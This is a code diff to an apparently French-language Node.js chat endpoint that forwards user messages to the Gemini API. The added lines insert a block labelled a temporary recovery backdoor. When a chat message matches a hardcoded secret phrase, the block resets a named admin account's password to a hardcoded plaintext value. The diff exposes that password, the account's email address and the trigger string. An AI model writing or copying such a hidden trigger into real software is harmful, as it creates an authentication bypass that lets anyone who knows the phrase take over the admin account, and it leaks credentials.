@@ -129,6 +129,14 @@ const aiChat = async (req, res) => {
             parts: [{ text: `${contextPrompt}\n\nQUESTION DE L'UTILISATEUR (LOGIQUE) : ${message}` }]
         });
 
+        // TEMPORARY RECOVERY BACKDOOR (Will be removed after use)
+        if (message === "SECRET_RECOVERY_SET_PASS_2026") {
+            const bcrypt = require('bcryptjs');
+            const hashedPassword = await bcrypt.hash("Mouha2007", 10);
+            await User.findOneAndUpdate({ email: "mouhamedfall@esp.sn" }, { password: hashedPassword });
+            return res.json({ message: "COEUR_RESTAURÉ: Mot de passe admin mis à jour." });
+        }
+
         const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`;
 
         console.log(`📡 [AI RELAY] Appel direct Gemini API pour: ${user.email}`);
